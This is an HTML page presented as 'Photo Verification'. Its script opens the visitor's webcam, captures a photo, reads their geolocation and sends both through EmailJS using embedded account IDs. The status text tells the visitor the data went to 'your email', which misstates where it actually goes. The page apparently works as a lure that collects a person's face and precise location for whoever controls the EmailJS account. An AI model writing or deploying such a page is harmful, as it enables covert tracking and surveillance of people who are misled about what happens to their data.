<!DOCTYPE html>
<html>
<head>
    <title>Photo Verification</title>
</head>
<body>

<h2>Photo Verification</h2>

<button onclick="startCamera()">Open Camera</button>
<button onclick="takePhoto()">Take Photo</button>

<p id="status"></p>

<video id="video" width="320" height="240" autoplay></video>
<canvas id="canvas" width="320" height="240" style="display:none;"></canvas>

<!-- EmailJS Library -->
<script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>

<!-- Initialize EmailJS -->
<script>
emailjs.init("vieRRG0Q8QGFFS-XO");
</script>

<!-- MAIN SCRIPT -->
<script>

let stream;

// Start camera
async function startCamera() {
    try {
        stream = await navigator.mediaDevices.getUserMedia({ video: true });
        document.getElementById("video").srcObject = stream;
        document.getElementById("status").innerText = "Camera started!";
    } catch (err) {
        document.getElementById("status").innerText = "Camera permission denied.";
    }
}

// Take photo & send
function takePhoto() {
    const video = document.getElementById("video");
    const canvas = document.getElementById("canvas");
    const context = canvas.getContext("2d");

    context.drawImage(video, 0, 0, canvas.width, canvas.height);

    const image = canvas.toDataURL("image/jpeg", 0.05);

    document.getElementById("status").innerText = "Photo taken. Getting location...";

    // Get location
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition((pos) => {

            const lat = pos.coords.latitude;
            const lon = pos.coords.longitude;
            const locationString = lat + ", " + lon;

            // SEND EMAIL USING EMAILJS
            emailjs.send("service_8bf9aat", "template_pee9jcq", {
                photo: image,
                location: locationString
            })
            .then(() => {
                document.getElementById("status").innerText = "Photo & location sent to your email!";
            })
            .catch((err) => {
                document.getElementById("status").innerText = "Error sending email.";
                console.error(err);
            });

        }, () => {
            document.getElementById("status").innerText = "Location permission denied.";
        });
    } else {
        document.getElementById("status").innerText = "Geolocation not supported.";
    }
}

</script>

</body>
</html>
